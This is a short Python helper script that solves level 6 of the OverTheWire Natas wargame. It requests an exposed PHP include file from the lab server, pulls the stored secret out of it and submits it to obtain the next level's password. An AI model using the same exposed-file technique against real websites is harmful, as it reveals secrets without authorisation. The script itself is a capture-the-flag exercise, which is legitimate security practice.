"""
Help script to resolve natas challenge #6
"""
import requests
import json

level = 'natas6'
url = 'http://{}.natas.labs.overthewire.org'.format(level)

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
In the PHP code we see that the correct value of the secret is stored in the
file "includes/secret.inc". A little bit of directory traversal will do the
rest.
"""
response = requests.get(url+'/includes/secret.inc', auth=auth)
secret = response.text.split('\n')[1].split('"')[1]  # Ad-hoc text processing,
response = requests.post(url, auth=auth, data={'secret': secret, 'submit': 'submit'})
print(response.text)
